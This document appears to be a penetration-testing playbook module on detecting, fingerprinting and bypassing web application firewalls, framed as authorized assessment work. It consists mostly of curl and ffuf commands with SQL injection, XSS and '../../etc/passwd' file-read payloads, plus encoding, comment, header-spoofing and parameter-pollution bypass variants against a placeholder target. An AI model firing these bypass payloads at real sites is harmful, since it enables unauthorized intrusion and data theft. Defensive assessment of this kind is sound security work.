# Module: WAF Analysis
## Detection, Fingerprinting, and Bypass Research

---

> **Note:** WAF bypass research during an authorized engagement is intended to assess the effectiveness of the client's WAF configuration. The goal is to determine if the WAF provides meaningful protection or can be circumvented.

---

## 6.1 WAF Detection

### Passive Detection (Response Headers)
```bash
# Look for WAF-specific headers in responses
curl -s -I "https://target.com" | grep -iE \
  "x-sucuri|x-firewall|x-waf|server.*cloudflare|x-iinfo|x-cdn|cf-ray|x-protected"
```

### Common WAF Header Signatures

| WAF | Header Indicator |
|-----|-----------------|
| Cloudflare | `CF-RAY`, `Server: cloudflare` |
| Sucuri | `X-Sucuri-ID`, `X-Sucuri-Cache` |
| Imperva/Incapsula | `X-Iinfo`, `visid_incap_` cookie |
| AWS WAF | `x-amzn-RequestId`, no direct header |
| F5 BIG-IP ASM | `X-WA-Info`, `TS` cookie |
| ModSecurity | `Mod_Security`, error page fingerprint |
| Barracuda | `barra_counter_session` cookie |
| Akamai | `X-Check-Cacheable`, `AkamaiGHost` |

### Active Detection (wafw00f)
```bash
wafw00f https://target.com
wafw00f https://target.com -a  # Try all WAF tests
wafw00f https://target.com -v  # Verbose output
```

### Manual Detection via Attack Probes
```bash
# Send known attack signature — 403/406 response = WAF present
curl -s -o /dev/null -w "%{http_code}" \
  "https://target.com/?id=1' OR 1=1--"

curl -s -o /dev/null -w "%{http_code}" \
  "https://target.com/?q=<script>alert(1)</script>"

# 200 = No WAF or bypassed
# 403/406/503 = WAF blocking
# 200 with empty body = Possible silent drop
```

---

## 6.2 WAF Behavior Analysis

### Determine Blocking Type
```bash
# Test different attack classes and note:
# - HTTP status code returned
# - Response body (error message)
# - Time to response (timeout-based blocking)
# - Headers in blocked response

# SQL Injection
curl -v "https://target.com/?id=1' OR 1=1--" 2>&1

# XSS
curl -v "https://target.com/?q=<script>alert(1)</script>" 2>&1

# LFI
curl -v "https://target.com/?file=../../etc/passwd" 2>&1

# Log: HTTP code, response body snippet, blocking header
```

### Build a Blocking Map

| Attack Type | Default Block | Can Bypass |
|-------------|--------------|------------|
| SQLi Basic | ✅ | ? |
| SQLi Encoded | ? | ? |
| XSS Basic | ✅ | ? |
| XSS Encoded | ? | ? |
| LFI | ? | ? |
| SSRF | ? | ? |

Fill this in during testing.

---

## 6.3 Bypass Strategy Testing

### Strategy 1: Encoding
```bash
# URL encode the attack payload
# Original: ' OR 1=1--
# URL encoded:
curl "https://target.com/?id=%27%20OR%201%3D1--"

# Double URL encoded:
curl "https://target.com/?id=%2527%2520OR%25201%253D1--"

# HTML entity encoded (for reflected contexts):
curl "https://target.com/?id=&#39; OR 1=1--"
```

### Strategy 2: Case Variation
```bash
# Original blocked: SELECT * FROM users
# Case variation:
curl "https://target.com/?id=1 SeLeCt * FrOm UsErS--"
curl "https://target.com/?id=1 SELECT%20*%20FROM%20users--"
```

### Strategy 3: Comment Insertion
```bash
# MySQL inline comments
curl "https://target.com/?id=1/**/OR/**/1=1--"
curl "https://target.com/?id=1/*!50000OR*/1=1--"

# Whitespace alternatives
curl "https://target.com/?id=1%09OR%091=1--"   # Tab
curl "https://target.com/?id=1%0aOR%0a1=1--"   # Newline
curl "https://target.com/?id=1%0dOR%0d1=1--"   # Carriage return
```

### Strategy 4: Header Manipulation
```bash
# Try IP spoofing headers (may whitelist internal IPs)
curl "https://target.com/?id=1' OR 1=1--" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1"

# Try different Content-Type
curl -X POST "https://target.com/api/search" \
  -H "Content-Type: application/json" \
  -d '{"search":"<script>alert(1)</script>"}'

# vs
curl -X POST "https://target.com/api/search" \
  -H "Content-Type: text/xml" \
  -d '<search><![CDATA[<script>alert(1)</script>]]></search>'
```

### Strategy 5: Parameter Pollution
```bash
# First value + second value combined
curl "https://target.com/?id=1&id=2 UNION SELECT 1,2,3--"

# Fragmented injection
curl "https://target.com/?id=1/*&id=*/UNION SELECT 1,2,3--"
```

### Strategy 6: User-Agent Rotation
```bash
# Some WAFs apply different rules based on User-Agent
curl "https://target.com/?id=1' OR 1=1--" \
  -H "User-Agent: Googlebot/2.1"

# Or use user-agents.txt with ffuf:
ffuf -u "https://target.com/?id=FUZZ" \
  -w config/payloads/sqli.txt \
  -H "User-Agent: $(shuf -n 1 config/user-agents.txt)"
```

---

## 6.4 Logging Bypass Results

For each bypass attempt, record in `output/findings.json`:

```json
{
  "waf_analysis": {
    "waf_detected": true,
    "waf_vendor": "Cloudflare",
    "detection_method": "CF-RAY header present",
    "bypass_attempts": [
      {
        "technique": "URL encoding",
        "payload": "%27%20OR%201%3D1--",
        "result": "blocked",
        "http_status": 403
      },
      {
        "technique": "Comment insertion",
        "payload": "' OR/**/1=1--",
        "result": "bypassed",
        "http_status": 200,
        "evidence": "Response contained database records"
      }
    ]
  }
}
```

---

## WAF Analysis Checklist

- [ ] WAF vendor identified (wafw00f + manual headers)
- [ ] Blocking behavior documented (HTTP codes, messages)
- [ ] URL encoding bypass tested
- [ ] Double URL encoding bypass tested
- [ ] Case variation bypass tested
- [ ] Comment insertion bypass tested
- [ ] Whitespace alternative bypass tested
- [ ] Header manipulation bypass tested
- [ ] Parameter pollution bypass tested
- [ ] JSON/XML content-type bypass tested
- [ ] User-agent rotation tested
- [ ] All results logged in findings.json
- [ ] Bypass effectiveness rated for each attack class
